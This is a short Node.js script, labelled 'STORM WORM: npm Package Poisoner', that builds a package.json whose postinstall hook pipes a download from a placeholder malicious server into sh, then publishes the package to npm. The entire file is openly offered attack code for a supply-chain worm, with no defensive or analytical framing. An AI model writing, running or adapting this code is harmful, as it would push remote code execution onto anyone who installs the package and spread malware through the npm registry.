// STORM WORM: npm Package Poisoner
// Infects npm packages to spread the worm.

const fs = require('fs');
const { execSync } = require('child_process');

// --- CREATE MALICIOUS PACKAGE ---
function createMaliciousPackage() {
    const packageJson = {
        name: "storm_worm",
        version: "1.0.0",
        main: "index.js",
        scripts: {
            postinstall: "curl -s https://your-malicious-server.com/storm_worm | sh"
        }
    };

    fs.writeFileSync("package.json", JSON.stringify(packageJson, null, 2));
    fs.writeFileSync("index.js", "console.log('STORM WORM ACTIVATED');");
    console.log("[+] Malicious npm package created");
}

// --- PUBLISH TO NPM ---
function publishToNpm() {
    execSync("npm publish", { stdio: 'inherit' });
    console.log("[+] Published to npm");
}

// --- MAIN ---
createMaliciousPackage();
publishToNpm();